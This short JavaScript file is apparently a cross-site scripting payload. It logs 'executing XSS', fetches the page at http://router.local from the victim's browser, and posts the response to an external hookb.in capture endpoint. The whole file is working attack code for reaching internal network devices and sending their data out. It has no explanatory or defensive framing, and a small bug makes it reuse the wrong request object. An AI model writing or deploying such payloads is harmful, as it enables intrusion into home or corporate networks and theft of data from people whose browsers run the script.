const ROUTER = "http://router.local";
const ENDPOINT = "https://hookb.in/XkozB9BEQ6hDYMQQEw8Z";

function forwardResponse(res) {
	let fwdxhr = new XMLHttpRequest();
	xhr.open("POST", ENDPOINT, true);
	xhr.setRequestHeader("Content-Type", "application/json");
	xhr.setRequestHeader("X-Requested-With", "XMLHttpRequest");
	const data = JSON.stringify({
		"data": res,
	});
	xhr.send(data)
}

console.log('executing XSS');

let xhr = new XMLHttpRequest();

xhr.onreadystatechange = function() {
	if (xhr.readyState === 4) {
		forwardResponse(xhr.response)
	}
}

xhr.open("GET", ROUTER, true);
xhr.send('');
